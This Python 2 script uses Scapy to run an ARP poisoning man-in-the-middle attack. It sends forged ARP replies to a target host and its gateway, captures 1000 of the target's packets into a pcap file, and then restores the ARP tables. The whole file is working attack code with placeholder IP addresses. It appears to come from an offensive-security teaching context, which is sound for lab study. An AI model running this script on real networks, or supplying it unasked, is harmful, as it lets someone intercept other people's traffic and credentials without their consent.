#! /usr/bin/env python
# -*- coding:utf-8 -*-

from scapy.all import *

import os
import sys
import threading
import signal


def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
    print "[*] Resroring target..."
    
    send(ARP(op=2,psrc=gateway_ip,pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    send(ARP(op=2,psrc=target_ip,pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
    
def get_mac(ip_address):
    responses, unanswered=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
    
    for s,r in responses:
        return r[Ether].src
    
    return None
    
    
    

def poison_target(gateway_ip,gateway_mac,target_ip,target_mac,stop_event):
    poison_target=ARP()
    poison_target.op=2
    poison_target.psrc=gateway_ip
    poison_target.pdst=target_ip
    poison_target.hwdst=target_mac
    
    poison_gateway=ARP()
    poison_gateway.op=2
    poison_gateway.psrc=target_ip
    poison_gateway.pdst=gateway_ip
    poison_gateway.hwdst=gateway_mac
    
    print "[*] Beginning the ARP poison."
    
    while True:
        
        send(poison_target)
        send(poison_gateway)
        
        if stop_event.wait(2):
            break
        
    print "[*] finish the ARP poison"
    return



interface="eth0"
target_ip="0.0.0.0"
gateway_ip="0.0.0.0"
packet_count=1000
conf.iface=interface









conf.verb=0

print "[*] setting up %s" % interface

gateway_mac=get_mac(gateway_ip)

if gateway_mac is None:
    print "[*] Failed to get gateway Exiting"
    sys.exit(0)

else:
    print "[*] Gateway is %s in at %s" % (gateway_ip,gateway_mac)


target_mac=get_mac(target_ip)

if target_mac is None:
    print "[*]  NO target_mac"
    print "Exiting !!!"
    sys.exit(0)
else:
    print "[*] target is %s at %s" % (target_ip,target_mac)

stop_event=threading.Event()
poison_thread=threading.Thread(target=poison_target,
                               args=(gateway_ip,gateway_mac,target_ip,target_mac,stop_event))

poison_thread.start()

print "[*] Start sniffing %d" % packet_count

bph_filter="ip host %s" % target_ip

packets=sniff(count=packet_count,filter=bph_filter,iface=interface)

wrpcap('arp.pcap',packets)

stop_event.set()

poison_thread.join()

restore_target(gateway_ip,gateway_mac,target_ip,target_mac)

